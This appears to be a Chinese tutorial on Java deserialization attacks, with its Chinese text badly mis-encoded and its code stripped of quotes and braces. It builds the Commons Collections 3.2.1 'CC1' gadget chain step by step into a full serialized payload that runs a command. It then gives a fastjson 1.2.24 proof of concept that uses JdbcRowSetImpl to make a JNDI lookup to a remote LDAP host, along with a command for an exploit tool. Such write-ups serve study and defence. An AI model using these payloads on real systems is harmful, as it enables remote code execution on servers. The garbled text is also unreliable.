project.build.sourceEncodingUTF-8/project.build.sourceEncoding /properties dependencies !-- https://mvnrepository.com/artifact/commons-collections/commons-collections -- dependency groupIdcommons-collections/groupId artifactIdcommons-collections/artifactId version3.2.1/version /dependency /dependencies/project åŒæ­¥ååœ¨libé‡Œé¢çœ‹æœ‰æ— CCé“¾æ¡ ç„¶åä¸‹è½½jdkçš„æºç å› ä¸ºjdké‡Œé¢æˆ‘ä»¬è¿™æ¬¡çš„CC1éƒ½æ˜¯classæ–‡ä»¶ æˆ‘ä»¬æ— æ³•è·Ÿè¸ªéœ€è¦æºç æ¥å¸®åŠ© ä½ æ”¾å…¥è¿›å»åä½ æ‰“å¼€æºç éƒ½æ˜¯æ‰“å¼€çš„javaæ–‡ä»¶äº† jdk8ujdk8ujdk: af660750b2f4 https://archive.apache.org/dist/commons/collections/source/commons-collections-3.2.1-src.zip ä¸‹è½½åœ¨åº“é‡Œé¢å¼•ç”¨æºç æ¥æŸ¥çœ‹ åˆ°è¿™é‡Œç¯å¢ƒå°±é…ç½®å®Œæ¯• ä¸€äº›å‰æ1ï¼šåªæœ‰å®ç°äº† java.io.Serializable æ¥å£çš„ç±»ï¼Œæ‰èƒ½è¢« Java åºåˆ—åŒ– ååºåˆ—åŒ–æœºåˆ¶å¤„ç† 2ï¼šJava åœ¨ååºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ç±»ä¸­é‡å†™çš„ readObject æ–¹æ³•ï¼ˆè‹¥å­˜åœ¨ï¼‰ã€‚è¿™ä¸ªæ–¹æ³•ç›¸å½“äºä¸€ä¸ª â€œé’©å­â€â€”â€” å¦‚æœåœ¨å…¶ä¸­å†™å…¥æ¶æ„é€»è¾‘ï¼ˆæˆ–è°ƒç”¨å…¶ä»–å±é™©ç»„ä»¶ï¼‰ï¼Œå°±èƒ½åœ¨ååºåˆ—åŒ–æ—¶è¢«è§¦å‘ï¼Œæˆä¸ºæ¼æ´åˆ©ç”¨çš„å…¥å£ç‚¹ 1ï¼šTransformeræ¥å£ä¸åå°„è°ƒç”¨public Object transform(Object input);æäº¤ä¸€ä¸ªç±»è¿”å›ä¸€ä¸ªç±» ç„¶åæˆ‘ä»¬æŸ¥çœ‹ä¸‹å®ç°è¿™ä¸ªæ¥å£çš„ç±»æœ‰å“ªäº› orgapachecommonscollectionsfunctorsInvokerTransformer.java å‘ç°è¿™ä¸ªç±»ç”¨äº†è¿™ä¸ªæ¥å£ ctrl+H æŸ¥çœ‹å¼•ç”¨ç±» è¿™ä¸ªç±»é‡å†™äº†æ¥å£ æ ¸å¿ƒé€»è¾‘é€šè¿‡åå°„è°ƒç”¨ç›®æ ‡çš„æŒ‡å®šæ–¹æ³• public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) super(); iMethodName = methodName; iParamTypes = paramTypes; iArgs = args; public Object transform(Object input) if (input == null) return null; try Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); catch (NoSuchMethodException ex) throw new FunctorException(InvokerTransformer: The method + iMethodName + on + input.getClass() + does not exist); catch (IllegalAccessException ex) throw new FunctorException(InvokerTransformer: The method + iMethodName + on + input.getClass() + cannot be accessed); catch (InvocationTargetException ex) throw new FunctorException(InvokerTransformer: The method + iMethodName + on + input.getClass() + threw an exception, ex); å¦‚æœæˆ‘ä»¬è¦æ‰§è¡Œå‘½ä»¤å°±æ¯”å¦‚ç”¨ä¸‹é¢ä»£ç  import org.junit.Test;import java.io.IOException;public class test @Test public void invokerExec() throws IOException Runtime.getRuntime().exec(calc); é‚£ä¹ˆæˆ‘ä»¬æ€ä¹ˆä½¿ç”¨åå°„æ¥è¿›è¡Œè°ƒç”¨runtime.execæ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‘¢ InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc);invokerTransformernew.transform(Runtime.getRuntime());é€šè¿‡è¿™ä¸ªä»£ç è°ƒç”¨transformeræ–¹æ³•å¯ä»¥ç›´æ¥å‡ºç³»ç»Ÿå‘½ä»¤new Class[]String.class â†’ å‘Šè¯‰åå°„ï¼šâ€œæˆ‘è¦è°ƒç”¨çš„ exec æ–¹æ³•éœ€è¦ä¸€ä¸ª String ç±»å‹çš„å‚æ•°â€ã€‚new Object[]calc â†’ å‘Šè¯‰åå°„ï¼šâ€œç»™è¿™ä¸ª exec æ–¹æ³•ä¼ å…¥å‚æ•°å€¼ calcâ€ã€‚ æ‰€ä»¥æˆ‘ä»¬æˆåŠŸé€šè¿‡transformeræ‰§è¡Œäº†ç³»ç»Ÿå‘½ä»¤æ‰€ä»¥æˆ‘ä»¬å°±è¦å¾€å‰æ¨äº† 2ï¼šè°è°ƒç”¨äº†transformæ–¹æ³•æ‰¾åˆ°äº†orgapachecommonscollectionsmapTransformedMap.java è¿™ä¸ªé‡Œé¢è°ƒç”¨äº†transformer protected Object checkSetValue(Object value) return valueTransformer.transform(value);æ³¨æ„æ˜¯protected æ‰€ä»¥valueTransformerå¦‚æœç­‰äºinvokeTransformer.transform å°±å¯ä»¥æ‰§è¡Œäº† public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) return new TransformedMap(map, keyTransformer, valueTransformer); åœ¨å®ƒä¸Šé¢çš„è¿™ä¸ªæ–¹å¼æ˜¯æ›¿æ¢çš„æ ¸å¿ƒæ–¹æ³• å¦‚æœcheckSetValueä¸æ˜¯protectå°±æ˜¯è°ƒç”¨æ‰€ä»¥æˆ‘ä»¬è¦æ‰¾åˆ°èƒ½æ‰¾åˆ°çš„è°ƒç”¨checkSetValueçš„ç±»public void invokerExec2() throws IOException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); Map decorate = TransformedMap.decorate(null,null,invokerTransformernew); TransformedMap.checkSetValue() æ‰€ä»¥decorateå¯ä»¥æ„å»ºTransformedMapç±»ä½†æ˜¯æ˜¯protectçš„ protected Object checkSetValue(Object value) return valueTransformer.transform(value); æŸ¥æ‰¾ç”¨æ³•åœ¨orgapachecommonscollectionsmapAbstractInputCheckedMapDecorator.java TransformedMapç»§æ‰¿è‡ªAbstractInputCheckedMapDecorator æ‰¾åˆ°äº†checkSetValuepublic Object setValue(Object value) value = parent.checkSetValue(value); return entry.setValue(value); æ‰€ä»¥æˆ‘ä»¬æ•´ç†ä¸€ä¸‹ protected Object checkSetValue(Object value) return valueTransformer.transform(value); 1 InvokerTransformerç»§æ‰¿äº†transformeræ¥å£ï¼ŒTransformedMapé‡Œé¢å¯ä»¥è°ƒç”¨InvokerTransformer 2 æˆ‘ä»¬é€šè¿‡decorateæ¥ç”Ÿæˆä¸€ä¸ªMapå¯¹è±¡é‡Œé¢Transformer valueTransformerå°±ä¼ å…¥ invokerTransformernew(è‡ªå·±å®šä¹‰çš„) å› ä¸ºinvokexx æ˜¯å®ç°äº†è¿™æ¥å£çš„ 3 æˆ‘ä»¬è®¾ç½®å¥½äº†invoketransformer(ä½†æ˜¯é‡Œé¢çš„æ•°å€¼æˆ‘ä»¬è¿˜ä¸èƒ½è®¾ç½®å•Š) 4æˆ‘ä»¬æ‰¾åˆ°äº†setValueé‡Œé¢è°ƒç”¨äº†checkSetValueæˆ‘ä»¬å°±ä¼ å…¥Runtime.getRuntime()å°±å¯ä»¥æ‰§è¡Œäº† tip: â€‹\t1 å­ç±»æ²¡æœ‰é‡å†™çˆ¶ç±»æ–¹æ³• â€‹\t2 ä½¿ parent æŒ‡å‘å­ç±»å®ä¾‹ï¼Œè°ƒç”¨ parent.checkSetValue æ—¶ï¼Œæ‰§è¡Œçš„è¿˜æ˜¯ çˆ¶ç±»çš„ checkSetValue æ–¹æ³•ï¼ˆå› ä¸ºå­ç±»æ²¡æœ‰æä¾›æ–°çš„å®ç°ï¼Œåªèƒ½ç”¨çˆ¶ç±»çš„ï¼‰ â€‹\t3 return new TransformedMap(map, keyTransformer, valueTransformer); è¿™ä¸ªæ˜¯æœ‰äº†åŸæœ¬mapçš„æ•°æ®ï¼Œç„¶åæˆ‘ä»¬**Map çš„ entrySet() æ–¹æ³•è·å– MapEntry å®ä¾‹**ï¼Œå†è°ƒç”¨å®ƒçš„æ–¹æ³• æ¡ˆä¾‹ public class TestMapEntry public static void main(String[] args) // 1. åˆ›å»ºMapå¹¶æ·»åŠ æ•°æ® MapString, String map = new HashMap(); map.put(name, å¼ ä¸‰); map.put(age, 20); // 2. è·å–æ‰€æœ‰MapEntryå®ä¾‹ SetMap.EntryString, String entries = map.entrySet(); // 3. éå†å¹¶è°ƒç”¨MapEntryçš„æ–¹æ³• for (Map.EntryString, String entry : entries) // è°ƒç”¨getKey()å’ŒgetValue() String key = entry.getKey(); String value = entry.getValue(); System.out.println(key: + key + , value: + value); // è°ƒç”¨setValue()ä¿®æ”¹å€¼ï¼ˆä»¥ageä¸ºä¾‹ï¼‰ if (age.equals(key)) entry.setValue(21); // ä¿®æ”¹valueä¸º21 System.out.println(ä¿®æ”¹åageçš„value: + entry.getValue()); // éªŒè¯åŸå§‹Mapçš„å€¼ä¹Ÿè¢«ä¿®æ”¹äº†ï¼ˆå› ä¸ºå…±äº«æ•°æ®ï¼‰ System.out.println(åŸå§‹Mapä¸­ageçš„å€¼: + map.get(age)); // è¾“å‡º21 æ€»çš„æ¥è¯´çˆ¶ç±» AbstractInputCheckedMapDecorator ä¸­çš„ MapEntry å†…éƒ¨ç±»ï¼Œé‡å†™äº† Map.Entry æ¥å£çš„ setValue æ–¹æ³• **ï¼Œè¿™æ‰å¯¼è‡´å®ƒçš„ setValue è¡Œä¸ºå’Œæ™®é€š Mapï¼ˆå¦‚ HashMapï¼‰çš„ setValue ä¸åŒ public void invokerExec2() throws IOException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew); HashMapObject, Object map = new HashMap(); map.put(a,b); MapObject, Object decorated = TransformedMap.decorate(map, null, invokerTransformernew); //å–å‡ºdecoratedä¸­æ‰€æœ‰çš„é”®å€¼å¯¹ï¼Œèµ‹å€¼ç»™entryå˜é‡ï¼Œç„¶åæ‰§è¡Œå¾ªç¯ä½“ï¼ˆä½ çš„ä»£ç ä¸­æ˜¯æ‰“å°entry for (Map.EntryObject, Object entry : decorated.entrySet()) //System.out.println(entry); entry.setValue(Runtime.getRuntime()); é‚£ä¹ˆåˆ°äº†ç°åœ¨æˆ‘ä»¬å°±åˆå¾€å‰æ¨è¿›äº†ä¸€æ­¥ 3ï¼šè°è°ƒç”¨äº†setvaluesunreflectannotationAnnotationInvocationHandler.java åœ¨è¿™ä¸ªç±»ä¸­ ä»–å®ç°äº†Serializableæ¥å£ class AnnotationInvocationHandler implements InvocationHandler, Serializable å®ƒåˆšå¥½å®ç°äº†ä¸‰ä¸ªéƒ¨åˆ† 1.å®ç°äº†åºåˆ—åŒ–æ¥å£ 2.é‡å†™äº†readobject 3.readobjecté‡Œé¢è°ƒç”¨äº†setValue é‚£ä¹ˆ memberValue æ€ä¹ˆå˜æˆæˆ‘ä»¬ä¸Šé¢çš„å¢å¼ºmapå‘¢ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try annotationType = AnnotationType.getInstance(type); catch(IllegalArgumentException e) // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(Non-annotation type in annotation serial stream); MapString, Class? memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.EntryString, Object memberValue : memberValues.entrySet()) String name = memberValue.getKey(); Class? memberType = memberTypes.get(name); if (memberType != null) // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + [ + value + ]).setMember( annotationType.members().get(name))); çœ‹ä»–çš„æ„é€ å‡½æ•°è¿›è¡Œä¼ å€¼,ä½†æ˜¯ä¸æ˜¯publicçš„æˆ‘ä»¬å°±ç”¨åå°„æ¥è°ƒç”¨å‡ºæ¥ typeæ˜¯æ³¨è§£ æ¯”å¦‚@type @restsponce AnnotationInvocationHandler(Class? extends Annotation type, MapString, Object memberValues) Class?[] superInterfaces = type.getInterfaces(); if (!type.isAnnotation() || superInterfaces.length != 1 || superInterfaces[0] != java.lang.annotation.Annotation.class) throw new AnnotationFormatError(Attempt to create proxy for a non-annotation type.); this.type = type; this.memberValues = memberValues; ä»£ç å¦‚ä¸‹ @Testpublic void invokerExec3() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew); HashMapObject, Object map = new HashMap(); map.put(a,b); MapObject, Object decorated = TransformedMap.decorate(map, null, invokerTransformernew); Class? aClass = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Target.class, decorated); CCtest.serialize(o); CCtest.unserialize(ser.bin);import org.junit.Test;import java.io.*;public class CCtest public static void serialize(Object obj) throws IOException ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(ser.bin)); objectOutputStream.writeObject(obj); public static Object unserialize(String filename) throws IOException, ClassNotFoundException ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); Object o = objectInputStream.readObject(); return o; @Test public void test() throws IOException, ClassNotFoundException unserialize(cc1.ser); æˆ‘ä»¬åœ¨ååºåˆ—åŒ–ä¼šè§¦å‘readobject ç„¶åæˆ‘ä»¬æ–­ç‚¹æŸ¥çœ‹æ˜¯å¦æ–­ä¸‹æ¥äº† åŒæ—¶æˆ‘ä»¬è¦æ»¡è¶³IFé¡ºåˆ©åˆ°è¾¾ä¸‹é¢ for (Map.EntryString, Object memberValue : memberValues.entrySet()) String name = memberValue.getKey(); Class? memberType = memberTypes.get(name); if (memberType != null) // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + [ + value + ]).setMember( annotationType.members().get(name))); åœ¨æˆ‘ä»¬ä¼ å…¥çš„Object o declaredConstructor.newInstance(Target.class, decorated);çš„targetæ³¨è§£é‡Œé¢å¿…é¡»mapé‡Œé¢è¦æœ‰è¿™ä¸ªå€¼æ¯”å¦‚éƒ½æœ‰çš„valueæ‰€ä»¥æˆ‘ä»¬è¦æŠŠkeyæ”¹ä¸ºvalue ç„¶åå› ä¸ºkeyé‡Œé¢ä¸ä¸ºç©ºæ‰€ä»¥è¿‡äº†ä¸ä¸ºnull @Testpublic void invokerExec3() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); //Map decorate = TransformedMap.decorate(null,null,invokerTransformernew); HashMapObject, Object map = new HashMap(); map.put(value,b); MapObject, Object decorated = TransformedMap.decorate(map, null, invokerTransformernew); Class? aClass = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Target.class, decorated); CCtest.serialize(o); CCtest.unserialize(ser.bin); AnnotationInvocationHandler æŠŠä½ ä¼ è¿›å»çš„ Map å½“æˆ æˆå‘˜å - å€¼ çš„æ˜ å°„æ¥å¤„ç†ï¼› å¦‚æœ key æ˜¯æ³¨è§£é‡Œä¸å­˜åœ¨çš„åå­—ï¼ˆmemberType == nullï¼‰ï¼ŒJDK ä¼šè·³è¿‡ï¼Œä¸ä¼šè°ƒç”¨ setValue()ï¼› æ‰€ä»¥åˆ©ç”¨æ—¶å¿…é¡»ä½¿ç”¨æ³¨è§£çœŸå®å­˜åœ¨çš„æˆå‘˜åï¼ˆvalue æ˜¯å¸¸ç”¨ä¸”å¯ç”¨çš„ä¸€ä¸ªï¼‰ã€‚ 4.setValueå€¼æ€ä¹ˆæ§åˆ¶if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + [ + value + ]).setMember( annotationType.members().get(name))); æˆ‘ä»¬åˆ°äº†setvalueå æ€ä¹ˆæ§åˆ¶é‡Œé¢çš„æ•°å€¼å‘¢ æˆ‘ä»¬åˆæ‰¾åˆ°äº†ä¸€ä¸ªtransformer class ConstantTransformer public Object transform(Object input) return iConstant; public ConstantTransformer(Object constantToReturn) super(); iConstant = constantToReturn; ä»–é‡å†™çš„transformer æ— è®ºä»€ä¹ˆéƒ½æ˜¯è¿”å›å…·ä½“çš„å®ä¾‹ ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); constantTransformer.transform(null); æ¯”å¦‚è¿™æ ·å…¶ä»–è¿˜æ˜¯Runtime.getRuntime ä½†æ˜¯è¿™æ ·åä½ æ²¡å‘ç°å— æˆ‘çš„exec å’Œ calcå»å“ªé‡Œäº†ï¼Ÿ è¿™é‡Œä¸å°±æ–­å¼€äº†å˜› ä½ æ‹¿åˆ°äº†Runtime.getruntimeä½†æ˜¯æ–¹æ³•å‘¢å‚æ•°å‘¢ 5.chainTransformer é“¾åœ¨ä¸€èµ·ç¥å¥‡çš„chaintransformer å®ƒçš„transformeræŠŠå¤šä¸ªç®€å•çš„è½¬æ¢æ­¥éª¤ç»„æˆä¸€ä¸ª â€œæµæ°´çº¿â€ï¼Œä¸Šä¸€ä¸ªè½¬æ¢çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªè½¬æ¢çš„è¾“å…¥public Object transform(Object object) // éå†å†…éƒ¨å­˜å‚¨çš„æ‰€æœ‰Transformerï¼ˆiTransformersæ˜¯ä¸€ä¸ªTransformeræ•°ç»„ï¼‰ for (int i = 0; i iTransformers.length; i++) // å…³é”®ï¼šå°†å½“å‰objectä½œä¸ºè¾“å…¥ï¼Œè°ƒç”¨ç¬¬iä¸ªTransformerçš„transformæ–¹æ³•ï¼Œ // å¹¶æŠŠè¿”å›å€¼é‡æ–°èµ‹å€¼ç»™objectï¼ˆä½œä¸ºä¸‹ä¸€ä¸ªTransformerçš„è¾“å…¥ï¼‰ object = iTransformers[i].transform(object); return object; å°±åƒinvoketransformer.transformer(constantTransformer.transformer) @Testpublic void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] constantTransformer, invokerTransformernew ); chainedTransformer.transform(test); ç„¶åæˆ‘ä»¬æ”¾å…¥ä»£ç  @Testpublic void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] constantTransformer, invokerTransformernew ); //chainedTransformer.transform(test); HashMapObject, Object map = new HashMap(); map.put(value,b); MapObject, Object decorated = TransformedMap.decorate(map, null, chainedTransformer); Class? aClass = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Target.class, decorated); CCtest.serialize(o); CCtest.unserialize(ser.bin); ä½†æ˜¯.RUNTIMEä¸èƒ½è¢«åºåˆ—åŒ– java.io.NotSerializableException: java.lang.Runtime ä½†æ˜¯Classæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ public final class ClassT implements java.io.Serializable, æˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥è°ƒç”¨runtime é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆæ ·ç»“åˆæˆ‘ä»¬ä¸Šé¢çš„transformå‘¢ Class class2 = Runtime.class;Method getRuntime = class2.getDeclaredMethod(getRuntime, null);getRuntime.setAccessible(true);Object invoke2 = getRuntime.invoke(null);//System.out.println(invoke2);Method exec = class2.getMethod(exec, String.class);exec.invoke(invoke2, calc); ç­”æ¡ˆå°±æ˜¯ä½¿ç”¨invokeåå¤è°ƒç”¨ public void invokerExec5() throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException //InvokerTransformer invokerTransformernew =new InvokerTransformer(exec,new Class[]String.class,new Object[]calc); //ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime()); ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] new ConstantTransformer(Runtime.class), new InvokerTransformer(getMethod,new Class[]String.class,Class[].class,new Object[]getRuntime,null), new InvokerTransformer(invoke,new Class[]Object.class,Object[].class,new Object[]null,null), new InvokerTransformer(exec,new Class[]String.class,new Object[]calc) ); //chainedTransformer.transform(test); HashMapObject, Object map = new HashMap(); map.put(value,value); MapObject, Object decorated = TransformedMap.decorate(map, null, chainedTransformer); Class? aClass = Class.forName(sun.reflect.annotation.AnnotationInvocationHandler); Constructor? declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class); declaredConstructor.setAccessible(true); Object o = declaredConstructor.newInstance(Target.class, decorated); CCtest.serialize(o); CCtest.unserialize(ser.bin);Runtime.classï¼ˆè¾“å…¥ï¼‰ â†’ç¬¬ä¸€ä¸ª transformer è°ƒç”¨getMethod(getRuntime) â†’ å¾—åˆ°getRuntimeæ–¹æ³•çš„Methodå¯¹è±¡ â†’ç¬¬äºŒä¸ª transformer è°ƒç”¨Method.invoke(null) â†’ å¾—åˆ°Runtimeå®ä¾‹ â†’ç¬¬ä¸‰ä¸ª transformer è°ƒç”¨Runtime.exec(calc) â†’ æ‰§è¡Œå‘½ä»¤ã€‚new InvokerTransformer( getMethod, // è¦è°ƒç”¨çš„æ–¹æ³•åï¼šClassç±»çš„getMethodæ–¹æ³• new Class[]String.class, Class[].class, // æ–¹æ³•å‚æ•°ç±»å‹ï¼šgetMethodçš„å‚æ•°ç±»å‹ new Object[]getRuntime, null // æ–¹æ³•å‚æ•°å€¼ï¼šè¦è·å–çš„æ–¹æ³•åå’Œå‚æ•°ç±»å‹æ•°ç»„)new InvokerTransformer( invoke, // è¦è°ƒç”¨çš„æ–¹æ³•åï¼šMethodç±»çš„invokeæ–¹æ³• new Class[]Object.class, Object[].class, // æ–¹æ³•å‚æ•°ç±»å‹ï¼šinvokeçš„å‚æ•°ç±»å‹ new Object[]null, null // æ–¹æ³•å‚æ•°å€¼ï¼šè°ƒç”¨è€…å®ä¾‹å’Œæ–¹æ³•å‚æ•°)new InvokerTransformer( exec, // è¦è°ƒç”¨çš„æ–¹æ³•åï¼šRuntimeç±»çš„execæ–¹æ³• new Class[]String.class, // æ–¹æ³•å‚æ•°ç±»å‹ï¼šexecçš„å‚æ•°ç±»å‹ new Object[]calc // æ–¹æ³•å‚æ•°å€¼ï¼šè¦æ‰§è¡Œçš„å‘½ä»¤) ä¿®å¤å‰ï¼ˆå¦‚ 8u65ï¼‰ï¼šreadObject ä¸­å¯¹ memberValues çš„éå†æ“ä½œï¼ˆmemberValues.entrySet()ï¼‰ä¼šè§¦å‘ TransformedMap çš„ setValue æ–¹æ³•ï¼Œè¿›è€Œæ‰§è¡Œæ¶æ„ Transformer é“¾ã€‚ ä¿®å¤åï¼ˆå¦‚ 8u71+ï¼‰ï¼šreadObject æ–¹æ³•è¢«é‡å†™ï¼Œä¸å†ç›´æ¥æ“ä½œ memberValuesï¼Œè€Œæ˜¯åˆ›å»ºæ–°çš„ LinkedHashMap æ¥å­˜å‚¨å€¼ï¼Œå½»åº•é˜»æ–­äº†å¯¹ TransformedMap çš„è°ƒç”¨é“¾è·¯ã€‚ äºŒï¼šfastjson 1.2.24fastjson å¯ä»¥é€šè¿‡ jsonå­—ç¬¦ä¸²è½¬æ¢ä¸º å¯¹è±¡ æˆ–è€…æŠŠ å¯¹è±¡è½¬æ¢ä¸ºjsonå­—ç¬¦ä¸² å®‰è£…ä¾èµ–dependency groupIdcom.alibaba/groupId artifactIdfastjson/artifactId version1.2.24/version/dependency 1:æˆ‘ä»¬å‡†å¤‡ä¸€ä¸ªæ¶æ„çš„ç±»java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C â€œcalcâ€ ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥å‡†å¤‡ JSON.parseObject æ˜¯ fastjson è‡ªå¸¦çš„æ–¹æ³• ååºåˆ—åŒ–ï¼šJSON.parseObject(jsonStr, ç›®æ ‡ç±»)ï¼ˆJSON å­—ç¬¦ä¸²â†’Java å¯¹è±¡ï¼‰ã€JSON.parse(jsonStr)ï¼ˆJSON å­—ç¬¦ä¸²â†’Objectï¼‰ï¼› åºåˆ—åŒ–ï¼šJSON.toJSONString(å¯¹è±¡)ï¼ˆJava å¯¹è±¡â†’JSON å­—ç¬¦ä¸²ï¼‰ã€‚ Jacksonï¼ˆSpring é»˜è®¤å†…ç½®ï¼‰ å¸¸è§„æ ¸å¿ƒç±»ï¼šcom.fasterxml.jackson.databind.ObjectMapper åŠŸèƒ½ï¼šJackson çš„æ ¸å¿ƒå¤„ç†ç±»ï¼Œé€šè¿‡å®ä¾‹æ–¹æ³•å®ç° JSON è½¬æ¢ï¼Œæ”¯æŒå¤æ‚å¯¹è±¡ï¼ˆå¦‚é›†åˆã€æ³›å‹ï¼‰ã€‚ å¸¸ç”¨æ–¹æ³•ï¼š ååºåˆ—åŒ–ï¼šobjectMapper.readValue(jsonStr, ç›®æ ‡ç±»)ï¼ˆJSONâ†’å¯¹è±¡ï¼‰ï¼› åºåˆ—åŒ–ï¼šobjectMapper.writeValueAsString(å¯¹è±¡)ï¼ˆå¯¹è±¡â†’JSONï¼‰ã€‚ å†…ç½®çš„ javax.json.Jsonï¼ˆæˆ–jakarta.json.Jsonï¼ŒJakarta EE ä¸­ï¼‰ï¼šç”¨äºæ„å»º JSON è¯»å†™å™¨ï¼› javax.json.bind.Jsonbï¼ˆJSON Binding APIï¼‰ï¼šç®€åŒ–å¯¹è±¡ä¸ JSON çš„ç»‘å®šï¼ˆç±»ä¼¼ JacksonGsonï¼‰ã€‚ å¸¸ç”¨æ–¹æ³•ï¼š ååºåˆ—åŒ–ï¼šJsonbBuilder.create().fromJson(jsonStr, ç›®æ ‡ç±»)ï¼› åºåˆ—åŒ–ï¼šJsonbBuilder.create().toJson(å¯¹è±¡)ã€‚ åŸç†æ˜¯JSON.parseObjectï¼ˆtext ï¼‰å‡½æ•°å®ƒæ˜¯è®²æ–‡æœ¬è½¬æ¢ä¸ºJAVAå¯¹è±¡ï¼Œå¦‚æœè¿™é‡Œå¯æ§å°±å¯ä»¥ä¼ å…¥æ¶æ„json 2ï¼šçœ‹çœ‹æ•ˆæœä»¥åŠpocimport com.alibaba.fastjson.JSON;import java.io.IOException;public class evil public static void main(String[] args) throws IOException String test = \\@type\\:\\com.sun.rowset.JdbcRowSetImpl;\\, + \\dataSourceName\\: + \\ldap://xxxxx\\, + \\autoCommit\\:true; JSON.parseObject(test); å¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ä¼ å…¥çš„ååºåˆ—åŒ–åæˆåŠŸè§¦å‘ æˆ‘ä»¬æ¥è·å–ä¸€ä¸‹å½“å‰çš„ç±» public static void main(String[] args) throws IOException String test = ame\\: \\Viper\\, + \\team\\: \\EDG2021\\; Object o = JSON.parseObject(test, Object.class); System.out.println(o.getClass().getName()); com.alibaba.fastjson.JSONObject æ‰“å°å‡ºæ¥æ˜¯com.alibaba.fastjson.JSONObject 3ï¼šå·¥ä½œåŸç†ä½†æ˜¯fastjsonæœ‰ä¸€ä¸ªç‰¹æ€§å¯ä»¥æŒ‡å®šç±»æ¯”å¦‚ åœ¨æ–‡æœ¬é‚£ä¸ªåŠ ä¸€ä¸ª@type å°±å¯ä»¥æŒ‡å®šç±» import com.alibaba.fastjson.JSON;import java.io.IOException;public class evil public static void main(String[] args) throws IOException String test = + \\@type\\ : \\org.example.test2\\, + ame\\: \\Viper\\, + \\team\\: \\EDG2021\\ + ; Object o = JSON.parseObject(test, Object.class); System.out.println(o.getClass().getName()); é‚£ä¹ˆæˆ‘ä»¬æƒ³fastjsonæ˜¯æ€ä¹ˆèµ‹å€¼çš„å— ç­”æ¡ˆæ˜¯ä¹Ÿæ˜¯å’Œæˆ‘ä»¬ä¸€æ ·çš„new ä¸€ä¸ªå¯¹è±¡ç„¶åè°ƒç”¨ getName getAgexxxèµ‹å€¼æ‰€ä»¥å®ƒä¼šè°ƒç”¨æ„é€ æ–¹æ³•å’Œsetæ–¹æ³• package org.example;public class test2 private String name; private int age; public test2() System.out.println(æ— å‚æ„é€ è¢«è§¦å‘äº†); public void setName(String name) this.name = name; System.out.println(å½“å‰nameæ˜¯ + name); public void setAge(int age) this.age = age; public test2(String name, int age) this.name = name; this.age = age; public String getName() return name; public int getAge() return age; å¯ä»¥çœ‹åˆ°ä»–å‡ºå‘äº†getName å’Œ æ„é€ å‡½æ•° 